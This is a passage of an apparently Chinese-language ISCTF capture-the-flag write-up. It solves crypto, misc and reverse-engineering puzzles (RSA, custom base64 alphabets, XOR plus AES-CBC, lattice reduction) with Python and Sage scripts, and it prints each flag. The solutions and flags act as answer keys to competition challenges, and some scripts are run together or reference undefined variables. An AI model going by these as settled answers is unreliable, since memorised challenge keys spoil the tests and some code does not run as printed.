operator">=</span> <span class="token number">106988826778655284666865642844938578070029566283623778317110345394696520999319699165122638213405544697509248818119744714371964212582672270467711234178627339558783803718844973937701655329775612593193896887658613019039808270266901149871250769922857432588126510259997039777751047281603319139760808677732919216899</span>e <span class="token operator">=</span> <span class="token number">740</span>c <span class="token operator">=</span> <span class="token number">6282526058961246581872664236584053247822096703448673698014149841099601111078858783085447440545491467659016466697346055841162217815656467685468263870813754625318960798390457353869689600971254126026498299128586642169553158659216998193596000256435504143502966206895545701691216757482393700125791878031903647831939512035110314068235625347074791191183719857770670134500097347113475463330210378392860796906074883251200522628116993249459465350593837432195675595929482809838619649519612607292091411530134831844063986714485104831320923176335931609571205307034732956741442770883207107022828296237748601658720079333177460160664</span>decrypt<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> e<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ISCTF{1dedc976-d253-4053-b2f5-557282f41fc5}</p><h2 id="蓝鲨密码"><a href="#蓝鲨密码" class="headerlink" title="蓝鲨密码"></a>蓝鲨密码</h2><p>先ook解码得到一串十六进制的字符</p><pre class="line-numbers language-none"><code class="language-nonespan aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后16进制转为字符得</p><pre class="line-numbers language-none"><code class="language-none">gANlhld8gl9bgANlhld8gl9b85d8gl9bkQx1kAJ2j5l5849clkkwkQx1kAIwkQx1kAJji45iiQ9clkl2j5l5kQx1kAJ2j5l5849clklji45iiRd8gl9bkQx1kAIwkQx1kAJ2j5l5gANlhk9clkl2j5l585d8gl9bkQx1kAJ2j5l585d8gl9b85d8gl9bkQx1kAJji45iiO1ji45iiRd8gl9bkQx1kAJji45iiO1ji45iiQ9clkkwkQx1kAJ2j5l5kQx1kAIwgANlhld8gl9bgANlhi1ji45iiRd8gl9b849clklji45iiO1ji45iiRd8gl9bgANlhld8gl9b849clkl2j5l5gANlhk9clkl2j5l5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后用base64解码但是默认的基本字母表是   A-Za-z0-9+&#x2F;&#x3D;  但是不太行  试了其他密码也解密不成功  又回来想了一下base64  改变一下基础字母表的顺序</p><p>直到试到  0-9a-zA-Z+&#x2F;&#x3D;为字母表得到flag</p><p>上脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64str_1 <span class="token operator">=</span> <span class="token string">"gANlhld8gl9bgANlhld8gl9b85d8gl9bkQx1kAJ2j5l5849clkkwkQx1kAIwkQx1kAJji45iiQ9clkl2j5l5kQx1kAJ2j5l5849clklji45iiRd8gl9bkQx1kAIwkQx1kAJ2j5l5gANlhk9clkl2j5l585d8gl9bkQx1kAJ2j5l585d8gl9b85d8gl9bkQx1kAJji45iiO1ji45iiRd8gl9bkQx1kAJji45iiO1ji45iiQ9clkkwkQx1kAJ2j5l5kQx1kAIwgANlhld8gl9bgANlhi1ji45iiRd8gl9b849clklji45iiO1ji45iiRd8gl9bgANlhld8gl9b849clkl2j5l5gANlhk9clkl2j5l5"</span>str_base <span class="token operator">=</span> <span class="token string">"0123456789abcdofghijk1mnepqrstuvwxyzABCDEFGHIJKLMN0PQRSTUVWXYZ+/"</span>str_zh_base <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str_1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>str_base<span class="token punctuation">,</span>str_zh_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">BLUESHARKBLUESHARK SHARKSHARKBLUE BLUE SHARK SHARKSHARKBLUEBLUESHARKBLUE BLUESHARKSHARKSHARK SHARKBLUEBLUEBLUEBLUE SHARKSHARKBLUE SHARK SHARKSHARKSHARK SHARKSHARKSHARKSHARK SHARKBLUE SHARKBLUESHARK BLUESHARKBLUE SHARKSHARK BLUESHARK SHARKSHARKBLUESHARK BLUEBLUEBLUEBLUEBLUE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到这样的一串字符  明显的二进制形式</p><p>转化为二进制得</p><p>根据尝试   BLUE代表1  SHARK代表 0</p><pre class="line-numbers language-none"><code class="language-none">1010 001 1 0 001101 1000 01111 001 0 000 0000 01 010 101 00 10 0010 11111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>二进制没有解出来东西   看到其中带空格  想到摩丝密码</p><p>试一下摩斯密码</p><p>-.-. ..- - . ..–.- -… .—- ..- . … …. .- .-. -.- .. -. ..-. —–</p><p>CUTE_B1UESHARKINF0</p><p>提交发生大写不对转化为小写试一下</p><p>ISCTF{cute_b1uesharkinf0}</p><h2 id="easy-AES"><a href="#easy-AES" class="headerlink" title="easy_AES"></a>easy_AES</h2><pre class="line-numbers language-none"><code class="language-none">本来是用base64在线网站解密结果什么都出不来    然后利用了base集成工具解密得到是字节流第一个解密结果b&#39;\x00\x07\n\x00\x0f&#x2F;&#x2F;8(3\x16:&amp; \x16\x1c,&amp;,)i\x07&lt;7*1:ui\x15\x0c\x07i?,-i&#x3D;:t\x07!0;(&lt;e\x1d\x1fi\x7fc\x7fa~&#96;\x7fb\x7f7\x7fe\x7fc&#39;第二个解密结果b&#39;\x14\xe6\xb9h\xb0cz\xe2\n\x00Zr\xf1\xe2\xe4M\xbeU\x93\xc7\xc8\xbd\xcf\x10\xb8\xca\x0b\x1e3A\xfd\xf7&#39;然后根据hint第一个是异或加密后得密文   第二个是aes加密后的密文  所以应该是AES_CBC模式     需要求出key和iv由于key一般是重复的   可以先求出重复的字节m1 &#x3D; b&#39;\x00\x07\n\x00\x0f&#x2F;&#x2F;8(3\x16:&amp; \x16\x1c,&amp;,)i\x07&lt;7*1:ui\x15\x0c\x07i?,-i&#x3D;:t\x07!0;(&lt;e\x1d\x1fi\x7fc\x7fa~&#96;\x7fb\x7f7\x7fe\x7fc&#39;c &#x3D; list(m1)a &#x3D; &quot;ISCTF&quot;b&#x3D;[]for i in a:     #把ISCTF转化为对应的ASCII码值    b.append(ord(i))for i in range(len(b)):    c1 &#x3D; b[i] ^ c[i]    print(chr(c1), end&#x3D;&#39;&#39;)#得到   ITITI   #所以key  是以I T 重复的然后把key填充的和m1一样长   在和m1进行异或 然后输出m1 &#x3D; b&#39;\x00\x07\n\x00\x0f&#x2F;&#x2F;8(3\x16:&amp; \x16\x1c,&amp;,)i\x07&lt;7*1:ui\x15\x0c\x07i?,-i&#x3D;:t\x07!0;(&lt;e\x1d\x1fi\x7fc\x7fa~&#96;\x7fb\x7f7\x7fe\x7fc&#39;c &#x3D; list(m1)key &#x3D; &#39;&#39;for j in range(len(c) &#x2F;&#x2F; 2):    key +&#x3D; &#39;IT&#39;# print(key)d&#x3D;[]for i in key:     #把key转化为对应的ASCII码值    d.append(ord(i))c1 &#x3D; &#39;&#39;for i in range(len(c)):    a &#x3D; chr(d[i] ^ c[i])    # key和m1进行异或    c1 &#x3D; &#39;&#39;.join(a)    print(c1, end&#x3D;&#39;&#39;)#AES key is Nuyoah,IV&#x3D;676574666c6167from Crypto.Cipher import AESfrom Crypto.Util.number import*def pad(c):    l &#x3D; len(c)    flag &#x3D; l % 16    if flag !&#x3D; 0:        add &#x3D; 16 - (l % 16)        c &#x3D; c + (&#39;\0&#39; * add).encode(&#39;utf-8&#39;)    return cm &#x3D; b&#39;\x14\xe6\xb9h\xb0cz\xe2\n\x00Zr\xf1\xe2\xe4M\xbeU\x93\xc7\xc8\xbd\xcf\x10\xb8\xca\x0b\x1e3A\xfd\xf7&#39;key &#x3D; b&#39;Nuyoah&#39;iv &#x3D; 0x676574666c6167iv &#x3D; long_to_bytes(iv)key &#x3D; pad(key)iv &#x3D; pad(iv)aes &#x3D; AES.new(key,AES.MODE_CBC,iv)flag &#x3D; aes.decrypt(m)print(flag)得到  flag  ISCTF&#123;Yu_SI00_JIngY4uan@66!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本来是用base64在线网站解密结果什么都出不来    然后利用了base集成工具解密得到是字节流</p><p>第一个解密结果</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x00\x07\n\x00\x0f&#x2F;&#x2F;8(3\x16:&amp; \x16\x1c,&amp;,)i\x07&lt;7*1:ui\x15\x0c\x07i?,-i&#x3D;:t\x07!0;(&lt;e\x1d\x1fi\x7fc\x7fa~&#96;\x7fb\x7f7\x7fe\x7fc&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二个解密结果</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x14\xe6\xb9h\xb0cz\xe2\n\x00Zr\xf1\xe2\xe4M\xbeU\x93\xc7\xc8\xbd\xcf\x10\xb8\xca\x0b\x1e3A\xfd\xf7&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后根据hint第一个是异或加密后得密文   第二个是aes加密后的密文  </p><p>所以应该是AES_CBC模式     需要求出key和iv</p><p>由于key一般是重复的   可以先求出重复的字节</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">m1 <span class="token operator">=</span> <span class="token string">b'\x00\x07\n\x00\x0f//8(3\x16:&amp; \x16\x1c,&amp;,)i\x07&lt;7*1:ui\x15\x0c\x07i?,-i=:t\x07!0;(&lt;e\x1d\x1fi\x7fc\x7fa~`\x7fb\x7f7\x7fe\x7fc'</span>c <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token string">"ISCTF"</span>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>     <span class="token comment">#把ISCTF转化为对应的ASCII码值</span>    b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c1 <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment">#得到   ITITI   </span><span class="token comment">#所以key  是以I T 重复的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后把key填充的和m1一样长   在和m1进行异或 然后输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">m1 <span class="token operator">=</span> <span class="token string">b'\x00\x07\n\x00\x0f//8(3\x16:&amp; \x16\x1c,&amp;,)i\x07&lt;7*1:ui\x15\x0c\x07i?,-i=:t\x07!0;(&lt;e\x1d\x1fi\x7fc\x7fa~`\x7fb\x7f7\x7fe\x7fc'</span>c <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">+=</span> <span class="token string">'IT'</span><span class="token comment"># print(key)</span>d<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>     <span class="token comment">#把key转化为对应的ASCII码值</span>    d<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># key和m1进行异或</span>    c1 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment">#AES key is Nuyoah,IV=676574666c6167</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    flag <span class="token operator">=</span> l <span class="token operator">%</span> <span class="token number">16</span>    <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        add <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token punctuation">(</span>l <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span>        c <span class="token operator">=</span> c <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'\0'</span> <span class="token operator">*</span> add<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> cm <span class="token operator">=</span> <span class="token string">b'\x14\xe6\xb9h\xb0cz\xe2\n\x00Zr\xf1\xe2\xe4M\xbeU\x93\xc7\xc8\xbd\xcf\x10\xb8\xca\x0b\x1e3A\xfd\xf7'</span>key <span class="token operator">=</span> <span class="token string">b'Nuyoah'</span>iv <span class="token operator">=</span> <span class="token number">0x676574666c6167</span>iv <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>key <span class="token operator">=</span> pad<span class="token punctuation">(</span>key<span class="token punctuation">)</span>iv <span class="token operator">=</span> pad<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span>iv<span class="token punctuation">)</span>flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ISCTF{Yu_SI00_JIngY4uan@66!}</p><h2 id="ezzzzzzzzzzzzzzzzzlattice"><a href="#ezzzzzzzzzzzzzzzzzlattice" class="headerlink" title="ezzzzzzzzzzzzzzzzzlattice"></a>ezzzzzzzzzzzzzzzzzlattice</h2><p>本来想通过所给的式子求出m但是所给的已知量很有限</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token punctuation">(</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">*</span> useful <span class="token operator">+</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据题目提示和题目源码应该是先构造一个格</p><pre class="line-numbers language-sage" data-language="sage"><code class="language-sage">#sageq &#x3D; 1315983632487139089617750670154806119268275210512095786866484175281321006406573324366047625051972678757c &#x3D; 60387115272108048744163258178807978405325618700171846384705851810106837854037850805257374685113348413056577421691682675686001837494490048119950328531119497762814869873825424704659636533573270470954454941469406739721475906819952069839004328782107324171279028483963429998937448889397109790478764402609376506913useful &#x3D; 162370170072252258856710656455811686368377830683038717890206663789692454074011190117398852659489809988489952239866676742924352883793663553325742572975946454543375668892992992200624019014742120485443782570890632500244797827950741064652268324028847648386398711812294242276270652020603354038915302515758254440951v1 &#x3D; vector(ZZ, [1, 0,-useful])v2 &#x3D; vector(ZZ, [0,1, c])v3 &#x3D; vector(ZZ, [0,0,p])s &#x3D; matrix([v1,v2,v3])# 利用LLL算法shortest_vector &#x3D; s.LLL()[0]print(shortest_vector)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">(375283327991706527645892100994438033485659744645186444913417551360585656230580960050994092510744912156, 1, 1302776248491245050044169675895743333702637313328702788561323578316558548494899852273477813698856258236)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>e的逆等于第一个数字</p><p>pow(m, e, q)等于第二数字</p><p>然后爆破出m</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token operator">*</span>q    m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'ISCTF&#123;'</span> <span class="token keyword">in</span> m<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总的脚本为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumq <span class="token operator">=</span> <span class="token number">1315983632487139089617750670154806119268275210512095786866484175281321006406573324366047625051972678757</span>c <span class="token operator">=</span> <span class="token number">60387115272108048744163258178807978405325618700171846384705851810106837854037850805257374685113348413056577421691682675686001837494490048119950328531119497762814869873825424704659636533573270470954454941469406739721475906819952069839004328782107324171279028483963429998937448889397109790478764402609376506913</span>useful <span class="token operator">=</span> <span class="token number">162370170072252258856710656455811686368377830683038717890206663789692454074011190117398852659489809988489952239866676742924352883793663553325742572975946454543375668892992992200624019014742120485443782570890632500244797827950741064652268324028847648386398711812294242276270652020603354038915302515758254440951</span>e0 <span class="token operator">=</span> <span class="token number">375283327991706527645892100994438033485659744645186444913417551360585656230580960050994092510744912156</span>c0 <span class="token operator">=</span> <span class="token number">1302776248491245050044169675895743333702637313328702788561323578316558548494899852273477813698856258236</span>e<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e1<span class="token punctuation">,</span>q<span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e0<span class="token punctuation">,</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c0<span class="token punctuation">,</span>d<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token operator">*</span>q    m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'ISCTF&#123;'</span> <span class="token keyword">in</span> m<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ISCTF{37f80ae2-5142-4f9b-827c-1620514e4030}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="酱紫乱"><a href="#酱紫乱" class="headerlink" title="酱紫乱"></a>酱紫乱</h2><p>写出脚本把所有文件读取 然后发现是base64编码  然后直接解码得到</p><pre class="line-numbers language-none"><code class="language-none">IIL&#123;oLSuI&#123;_33LFCS3LLrrII&#123;TuCSs_&#123;FIIosTr7s_&#123;3FuLu&#123;3I7su&#123;SuTcsrtL_tC_SsCIS&#123;FtcCTc_cL3o&#123;t7ICcor7uLTFc7&#123;3LIcoC37TIsTtcT7otcLF&#123;Io7u73ScoIs3crosTuSTIS_F3sF_&#123;CoS&#123;tsIFrLroCT__tsCocSCo&#123;ISIrsoFcu_L&#123;7C3IS_S_tTuSIc7uFLFC&#123;3rIs_o7cut&#123;tuoc_cTtrLTtSSICcooFI_CocrSLScC_L_ooI__u7T&#123;sT_rFT7Fto3&#123;uL77u3IoT__&#123;3o&#123;CItuLsc_sLTouotrF3S3r&#123;3srtFC&#123;7CLItuS_I_&#123;s_ctoLcsFC77cTcLrSusIo3rILCo&#123;77CrCuFL7r&#123;ouIcsu&#123;_7cFct33troIIrCt7CTSou_Sc7tCusL3Ts&#123;touSCF3SoT&#123;C7C_SSSorFTFS&#123;FtssorI&#123;I&#123;7&#123;3C&#123;sTrutL_Cr7Fr3s7TFT3Stcrst_cs&#123;uLsoIoLT3ScIsFFSFTTrFucTcuI&#123;L33_CStoCTroCrIIL_ucTITCttCFtCrS_rruCoSS7T_IuLs_T_S3cS&#123;r3I&#123;Ito7tuuo33&#123;IrscSr&#123;IIco7STSstLS7SuFSLIs7oF7_Cr7FuFtt&#123;uLSF&#123;TSrTTT_SSuStF&#123;I3CC3oI3srtCs7CLC_cFTccSLFFSCs_uTFCILT3_C_73L3cLSTS7r3&#123;&#123;so&#123;TSS&#123;F7CSr&#123;SoCLSFc_ccTT3L3F3FsosC__c7C_SLCuoSs&#123;CoTISuS&#123;3F&#123;S3IFT7&#123;_LFCItt_toFCuuo73S&#123;cFTcLT7oFLtoFICu__ucLTS3CcoSFITL&#123;srrscuCo_Lcss7o_F3cI&#123;7CTtcrur3SsostL7SFr&#123;oS_FIrLT&#123;IF73cTs_ooIcFTCsLscSrLru&#123;LruL_CTF3LuC&#123;c&#123;CI_FC77C&#123;3ott3CtCSFoCFCu7cITT7ILoCto_s&#123;TIF3s_IF&#123;LTctCo7STS_IIFSu_L3SC&#123;&#123;7totoSSsusT&#123;ou7CtI7&#123;srFtF&#123;cF3I&#123;uCs33SFCsF7&#123;surcTr&#123;SL_&#123;C&#123;s33tu__TsI7F7Io3u&#123;sFII&#123;_cSS_soLcFISTS_FrToITcToLLuss&#123;&#123;ocoIC337oo7CrIsT7cFTusoorLTT&#123;rcSIC&#123;IsFLCFC_SS&#123;&#123;_3IouscISScTC&#123;rttSC3tFu_S37u&#123;tCIos_&#123;TLc_ICCs7oLCco3IoIFLctLtIu3r&#123;&#123;s3ust7o_uFT3CT_7rCcuFT&#123;rFsFS_u_TCoooLcCFFcuuo_cSTtIcFT77oss__TL7uLo37CI_ucF_Fc3rI7urTTrs_T37oF_LIu33LC&#123;7TFrCCSus3oFIc7_3&#123;7LLtLtSTIF&#123;C7s_rIC&#123;STt_ttC3s&#123;I&#123;TCSL_&#123;LLuoC3&#123;SLTLu7c7uIc_I&#123;TSSucI_LFSScT&#123;FsT3ILtLcF3_7Csc_7c_LcI_&#123;TcFtC3&#123;o7T7TL_FSot3rFTS_Iu_SICtosr3o_crLrF_c3rTss&#123;_IrtSFFtCsc&#123;S_TL&#123;T&#123;TtcIucCCLIoItotLo_oCFo&#123;CoSoCccCrorS7toC&#123;oCtSoc33rsCouSTuCT3uL7Ict7rr&#123;3LosC_uTIssLL&#123;SLLFTo&#123;7LTIoI&#123;_cs7osrSCcLSs7CSL&#123;SL7L7&#123;uo_&#123;cuut3Lc&#123;LL&#125;rcF73&#123;&#123;CstTsIIsS_Lts&#123;FCStFFIs7tITS7S_uCCSuT_c&#123;373sL7rcLtTL7C3SoSuI_73Is7sTIcTII7CsuF3c_FIt3sTtFsSrLLFtFtstF_&#123;tSTrSToS&#123;_FI&#123;77Lu7usSuSsCo7ctTcFt&#123;&#123;FrTsso_C&#123;FFLtocICr7FTrr3ouTsSTt_ccLr&#123;_ITLIL&#123;7tTrusIIrcCI_IItoscISTFL&#123;LS&#123;TtcSt_CS3sr_tICcSotI3sFcFSu_&#123;stIuCtCr&#123;TTFF7FT3_F&#123;u3_CFCrFuFFo_TSuLto_SCTt&#123;I_tTo7oIosTur7&#123;stuLcrCIssttFc&#123;LSTcS_7FutFC&#123;rtTsFT7ccscCILI_CS7L3uIsSIFcctcutsr3SsTrSuc3cssIuTuTsoC3rscSru&#123;cTrsSS&#123;tT3ITI7csL33&#123;ccC_7rF_7_ocrLIur7&#123;tC3_urCIL_FL_sLuo7coFo_u37FTco&#123;_sTF7ssIsuI_uosSou&#123;CII&#123;r_IssI3_rL&#123;TosSor_CoC&#123;tssCtL&#123;TSSu_TLFCFLt_IcuouILos3turtuCFFIF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后用字频降序求</p><p>ISCTF{so_cLut73r}</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>把base64拖进IDA得</p><p><img src="/2023/02/01/ISCTF/1667397304287.png" alt="1667397304287"></p><p>得到一串base64编码</p><p>MTU5ZTMOMjIOYzAwZWFkMmQzYTAz0WQzMjA4NGV1NTA&#x3D;</p><p>但是用普通字母表解码得到乱码</p><p>然后根据主函数里面的函数找到</p><p><img src="/2023/02/01/ISCTF/1667397429357.png" alt="1667397429357"></p><p>把这个作为base64表解码</p><p>ABCDEFGHIJKLMN0PQRSTUVWXYZabcdofghijk1mnepqrstuvwxyzOl23456789+&#x2F;</p><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64str_1 <span class="token operator">=</span> <span class="token string">"MTU5ZTMOMjIOYzAwZWFkMmQzYTAz0WQzMjA4NGV1NTA="</span>str_base <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMN0PQRSTUVWXYZabcdofghijk1mnepqrstuvwxyzOl23456789+/"</span>str_zh_base <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str_1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>str_base<span class="token punctuation">,</span>str_zh_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#159e34224c00ead2d3a039d32084ee50</span><span 